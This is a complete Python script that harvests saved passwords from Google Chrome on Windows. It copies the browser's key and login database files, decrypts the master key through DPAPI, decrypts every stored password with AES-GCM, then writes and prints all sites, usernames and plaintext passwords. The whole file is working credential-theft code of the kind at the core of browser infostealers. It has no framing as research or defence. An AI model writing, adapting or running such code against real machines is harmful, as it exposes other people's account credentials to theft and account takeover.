import base64
import json
import sqlite3
import os
import shutil
import time
import win32crypt
from Crypto.Cipher import AES

def getkey():
    with open("Local State", "r", encoding="utf-8") as f:
        local_state_data = json.loads(f.read())

    return win32crypt.CryptUnprotectData(base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

def decrypt_password(password, key):

    iv = password[3:15]
    password = password[15:]

    return AES.new(key, AES.MODE_GCM, iv).decrypt(password)[:-16].decode()
    #return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

shutil.copy(os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Local State", "Local State")
shutil.copy(os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\Login Data", "Login Data")

db = sqlite3.connect("Login Data")
cursor = db.cursor()

cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_last_used desc;")

key = getkey()

with open('ChromePasswd-' + str(int(time.time())) + ".txt", 'w', encoding='utf-8') as fout:
    for row in cursor.fetchall():
        decrypt = decrypt_password(row[3], key)
        data = f"origin_url: {row[0]}\naction_url: {row[1]}\nusername: {row[2]}\npassword: {decrypt}\n\n"
        fout.write(data)
        print(data)

cursor.close()
db.close()

os.remove("Local State")
os.remove("Login Data")

os.system("pause")
